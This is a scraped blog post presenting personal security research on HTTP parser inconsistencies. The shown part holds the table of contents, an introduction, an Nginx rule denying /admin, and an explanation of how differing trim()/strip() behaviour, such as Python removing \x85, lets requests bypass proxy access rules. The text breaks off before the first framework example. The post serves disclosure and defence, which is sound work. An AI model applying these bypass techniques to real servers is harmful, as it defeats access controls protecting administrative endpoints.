href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" aria-label="Pathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800"><div id="d050ee56-187a-4a8e-9fa6-a99d575bb874" class="w-full break-words py-2 text-base focus:outline-none text-slate-700  dark:text-slate-200">Pathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules</div></a><ul class="pl-4 dark:border-slate-800"><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-nginx-acl-rules" aria-label="Nginx ACL Rules" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="fa166e5c-0b0e-4957-8eb7-88f7c58f4415" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">Nginx ACL Rules</div></a></li><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-trim-inconsistencies" aria-label="Trim Inconsistencies" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="f5554760-21fd-4080-9078-0e9a31adb2c5" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">Trim Inconsistencies</div></a></li><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-nodejs" aria-label="Bypassing Nginx ACL Rules With Node.js" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="04aa7506-34d7-4291-9c36-6f0429fef520" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">Bypassing Nginx ACL Rules With Node.js</div></a></li><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-flask" aria-label="Bypassing Nginx ACL Rules With Flask" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="1d9a1daa-f753-4b31-9452-fb3bccc334c5" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">Bypassing Nginx ACL Rules With Flask</div></a></li><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-spring-boot" aria-label="Bypassing Nginx ACL Rules With Spring Boot" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="bf06e637-fa3c-4b02-bbd0-535e8862ed60" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">Bypassing Nginx ACL Rules With Spring Boot</div></a></li><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-php-fpm-integration" aria-label="Bypassing Nginx ACL Rules With PHP-FPM Integration" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="8d8306a9-c4fa-4c45-92fa-aebb2e886f80" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">Bypassing Nginx ACL Rules With PHP-FPM Integration</div></a></li><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-how-to-prevent" aria-label="How to prevent" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="80d340c5-2edf-4d76-a751-cb85c81df78c" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">How to prevent</div></a></li></ul></li><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-aws-waf-acl" aria-label="Bypassing AWS WAF ACL" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800"><div id="6493de19-d626-479e-8986-84670b6f85ae" class="w-full break-words py-2 text-base focus:outline-none text-slate-700  dark:text-slate-200">Bypassing AWS WAF ACL</div></a><ul class="pl-4 dark:border-slate-800"><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-how-aws-waf-acls-work" aria-label="How AWS WAF ACLs Work" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="df30fef9-02f8-47db-9cbe-1e49a3f36343" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">How AWS WAF ACLs Work</div></a></li><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-aws-waf-acl-with-line-folding" aria-label="Bypassing AWS WAF ACL With Line Folding" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="70a52fc0-b644-4cc4-a712-6eb7ad60fc7f" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">Bypassing AWS WAF ACL With Line Folding</div></a></li></ul></li><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-incorrect-path-parsing-leads-to-server-side-request-forgery" aria-label="Incorrect Path Parsing Leads to Server-Side Request Forgery" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800"><div id="268678d3-485e-49a1-89c3-048811a313e2" class="w-full break-words py-2 text-base focus:outline-none text-slate-700  dark:text-slate-200">Incorrect Path Parsing Leads to Server-Side Request Forgery</div></a><ul class="pl-4 dark:border-slate-800"><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-ssrf-on-flask-through-incorrect-pathname-interpretation" aria-label="SSRF on Flask Through Incorrect Pathname Interpretation" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="1bcc7d29-1379-4cc8-8883-14c1c107dea2" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">SSRF on Flask Through Incorrect Pathname Interpretation</div></a></li><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" aria-label="SSRF on Spring Boot Through Incorrect Pathname Interpretation" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="7b140771-f25b-4aab-94ee-5bd0cff5a2ae" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">SSRF on Spring Boot Through Incorrect Pathname Interpretation</div></a></li><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" aria-label="PHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="c40f232f-b920-4fda-9696-dcf62c980f49" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">PHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation</div></a></li><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-how-to-prevent-1" aria-label="How to prevent" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="79b3a29d-790b-405f-89b2-bfadc5a39975" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">How to prevent</div></a></li></ul></li><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-http-desync-cache-poisoning-attacks" aria-label="HTTP Desync Cache Poisoning Attacks" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800"><div id="9eca8c72-0edf-49bf-8996-76be2ee82761" class="w-full break-words py-2 text-base focus:outline-none text-slate-700  dark:text-slate-200">HTTP Desync Cache Poisoning Attacks</div></a><ul class="pl-4 dark:border-slate-800"><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-cache-keys" aria-label="Cache Keys" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="73d5400e-1c74-4ecf-92d6-6cbecd247573" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">Cache Keys</div></a></li><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-s3-http-desync-cache-poisoning-issue" aria-label="S3 HTTP Desync Cache Poisoning Issue" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="81f4c133-20bb-4d3e-afcf-117cf80024c6" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">S3 HTTP Desync Cache Poisoning Issue</div></a><ul class="pl-4 dark:border-slate-800"><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-the-vulnerability" aria-label="The Vulnerability" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800 -mt-1"><span class="text-slate-400 dark:text-slate-500"><svg class="h-4 w-4 stroke-current" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.6665 4L10.6665 8L6.6665 12"></path></svg></span><div id="7ec99b8e-175c-4a52-aa2f-84d419d9ec8e" class="w-full break-words py-2 text-base focus:outline-none text-slate-600 dark:text-slate-300">The Vulnerability</div></a></li></ul></li></ul></li><li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-conclusion" aria-label="Conclusion" class="mb-1 flex items-center gap-x-2 rounded-lg px-2 focus:outline-none hover:bg-slate-100 focus:bg-slate-100 dark:hover:bg-slate-800 dark:focus:bg-slate-800"><div id="b8bf3109-7624-4bf1-a074-a1c3d0bd7727" class="w-full break-words py-2 text-base focus:outline-none text-slate-700  dark:text-slate-200">Conclusion</div></a></li></ul></div><div class="relative flex items-center justify-center pb-4"><button type="button" class="flex items-center justify-center gap-1.5 rounded-[28px] px-3 py-2 text-sm font-medium hover:bg-slate-100 dark:hover:bg-slate-800"><span class="text-slate-600 dark:text-slate-300">Show more</span><svg class="h-4 w-4 stroke-current text-slate-500" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 7L8 11L12 7"></path></svg></button></div></div><div id="post-content-parent" class="relative mb-10 pb-14"><div id="post-content-wrapper" class="prose prose-lg mx-auto mb-10 min-h-30 break-words dark:prose-dark xl:prose-xl"><p>The HTTP protocol plays a vital role in the seamless functioning of web applications, however, the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.</p>
<p>In this research, my focus revolves around the discovery of inconsistencies within HTTP parsers across various web technologies, including load balancers, reverse proxies, web servers, and caching servers. By investigating these disparities, I aim to shed light on potential new vulnerabilities that involve HTTP Desync attacks.</p>
<p>It was my first security research, I started on this journey in December 2021 and concluded in April 2022. I tried to be creative in finding new attack vectors due to incorrect HTTP parsing. In this post, I will share the final results of this study.</p>
<h1 id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" style="height: 48px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>Pathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules</h1>
<p>This section of the research focuses on the exploitable vulnerabilities arising from pathname manipulation in web servers, principally about the use of <code>trim()</code> or <code>strip()</code> functions. By exploiting these techniques, attackers can circumvent security rules specific to certain paths in reverse proxies and load balancers, posing a significant threat to web application security.</p>
<p>In this section, we delve into the intricacies of how web servers process and manipulate pathnames, investigating the impact of the removal of certain characters, which can lead to unintended behaviors.</p>
<h2 id="heading-nginx-acl-rules" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-nginx-acl-rules" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-nginx-acl-rules" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>Nginx ACL Rules</h2>
<p>Nginx is a powerful web server and reverse proxy which allows developers to apply security rules on HTTP requests. This section explores security threads of the capabilities of Nginx in rewriting or blocking HTTP messages, with a primary focus on rules triggered by specific strings or regular expressions found within the HTTP pathname section.</p>
<p>In Nginx, the "location" rule enables developers to define specific directives and behaviors based on the requested URL. This rule acts as a key component in routing and processing incoming HTTP requests, allowing control over how different URLs are handled.</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><pre><code class="lang-plaintext">location = /admin {
    deny all;
}

location = /admin/ {
    deny all;
}
</code></pre></div></div>
<p>The above Nginx rule aims to deny every access to the <code>/admin</code> endpoint, so if a user tries to access this endpoint, Nginx will return <code>403</code> and will not pass the HTTP message to the web server.</p>
<p>To prevent security issues on URI-based rules, Nginx performs path normalization before checking them. Path normalization in Nginx refers to the process of transforming and standardizing requested URLs to a consistent and canonical format before handling them. It involves removing redundant or unnecessary elements from the URL path, such as extra slashes, dot segments, processing path traversal, and URL-encoded characters, to ensure uniformity and proper routing within the web server.</p>
<h2 id="heading-trim-inconsistencies" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-trim-inconsistencies" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-trim-inconsistencies" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>Trim Inconsistencies</h2>
<p>Before we proceed, we need to understand what the <code>trim()</code> function does in different languages.</p>
<p>Different languages remove different characters when the correspondent function for <code>trim()</code> is called. Each server will normalize the pathname based on its <code>trim()</code>, removing different characters. But Nginx which is written in C, does not cover all characters for all languages.</p>
<p>E.g.: Python removes the character <code>\x85</code> with <code>strip()</code>, and JavaScript does not with <code>trim()</code>.</p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/bf6a391a-2bf5-4605-9e5e-8cc0f059a995.png" alt="" class="image--center mx-auto"></p>
<p><img loading="lazy" src="./(Research) Exploiting HTTP Parsers Inconsistencies_files/784cf8a4-b070-4bb6-abd0-12ae887d568c.png" alt="" class="image--center mx-auto"></p>
<p>If an HTTP message is parsed using the <code>trim()</code> function in different languages, an HTTP Desync attack can occur.</p>
<h2 id="heading-bypassing-nginx-acl-rules-with-nodejs" class="permalink-heading"><a class="permalink-heading-button" title="Permalink" href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-nodejs" data-clipboard-text="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-nodejs" style="height: 40px;"><span class="hidden">Permalink</span><svg class="h-4 w-4 fill-current dark:text-white" viewBox="0 0 512 512"><path d="M301.148 394.702l-79.2 79.19c-50.778 50.799-133.037 50.824-183.84 0-50.799-50.778-50.824-133.037 0-183.84l79.19-79.2a132.833 132.833 0 013.532-3.403c7.55-7.005 19.795-2.004 20.208 8.286.193 4.807.598 9.607 1.216 14.384.481 3.717-.746 7.447-3.397 10.096-16.48 16.469-75.142 75.128-75.3 75.286-36.738 36.759-36.731 96.188 0 132.94 36.759 36.738 96.188 36.731 132.94 0l79.2-79.2.36-.36c36.301-36.672 36.14-96.07-.37-132.58-8.214-8.214-17.577-14.58-27.585-19.109-4.566-2.066-7.426-6.667-7.134-11.67a62.197 62.197 0 012.826-15.259c2.103-6.601 9.531-9.961 15.919-7.28 15.073 6.324 29.187 15.62 41.435 27.868 50.688 50.689 50.679 133.17 0 183.851zm-90.296-93.554c12.248 12.248 26.362 21.544 41.435 27.868 6.388 2.68 13.816-.68 15.919-7.28a62.197 62.197 0 002.826-15.259c.292-5.003-2.569-9.604-7.134-11.67-10.008-4.528-19.371-10.894-27.585-19.109-36.51-36.51-36.671-95.908-.37-132.58l.36-.36 79.2-79.2c36.752-36.731 96.181-36.738 132.94 0 36.731 36.752 36.738 96.181 0 132.94-.157.157-58.819 58.817-75.3 75.286-2.651 2.65-3.878 6.379-3.397 10.096a163.156 163.156 0 011.216 14.384c.413 10.291 12.659 15.291 20.208 8.286a131.324 131.324 0 003.532-3.403l79.19-79.2c50.824-50.803 50.799-133.062 0-183.84-50.802-50.824-133.062-50.799-183.84 0l-79.2 79.19c-50.679 50.682-50.688 133.163 0 183.851z"></path></svg></a>Bypassing Nginx ACL Rules With Node.js</h2>
<p>Let's consider the following Nginx ACL rule and Node.js API source code using Express:</p>
<div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></span></button></div><div style="position:relative;"><div><button class="absolute right-0 top-0 m-2 font-mono text-xs font-semibold uppercase text-white focus:outline-none"><span class="flex flex-row items-center leading-none"><span class="mr-1">Copy</span><svg class="h-4 w-4 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 